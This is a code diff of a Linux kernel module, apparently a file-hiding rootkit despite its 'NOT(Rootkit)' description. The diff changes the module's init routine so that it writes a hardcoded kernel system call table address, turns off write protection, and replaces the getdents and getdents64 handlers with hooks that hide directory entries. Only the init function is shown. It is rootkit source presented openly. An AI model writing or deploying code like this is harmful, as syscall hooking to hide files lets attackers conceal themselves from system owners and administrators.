@@ -12,26 +12,29 @@ MODULE_DESCRIPTION("NOT(Rootkit - Hidefiles)");
 MODULE_LICENSE("GPL");
 
 void **sys_call_table;
+//sudo grep sys_call_table /proc/kallsyms
+void *sys_call_table_address = 0xffffffff9da00300;
 
 static int __init hidefiles_init(void)
 {
 	printk (KERN_INFO "start\n");
 
-	sys_call_table = (void **)find_sys_call_table();
+	sys_call_table = (void **)sys_call_table_address; 	
 	if(sys_call_table == NULL) {
 		printk (KERN_ERR "Failed to find sys call table\n");
 		return 1;
 	}
-	printk (KERN_INFO "start 2\n");
+
 	disable_write_protection();
-	printk (KERN_INFO "start 3 get dents = %d\n", __NR_getdents);
-//	original_getdents64 = sys_call_table[__NR_getdents64];
-	original_getdents = sys_call_table[__NR_getdents];
-//	sys_call_table[__NR_getdents64] = sys_getdents64_hook;
-	sys_call_table[__NR_getdents] = sys_getdents_hook;
+	original_getdents = sys_call_table[__NR_getdents64];
+	original_getdents_32 = sys_call_table[__NR_getdents];
+
+	sys_call_table[__NR_getdents64] = sys_getdents_hook;
+	sys_call_table[__NR_getdents] = sys_getdents32_hook;
 	enable_write_protection();
-	addfile("hidefiles");
-	addfile("hidefiles.ko");
+
+//	addfile("hidefiles");
+//	addfile("hidefiles.ko");
 	printk (KERN_INFO "end of start\n");
 	return 0;
 }
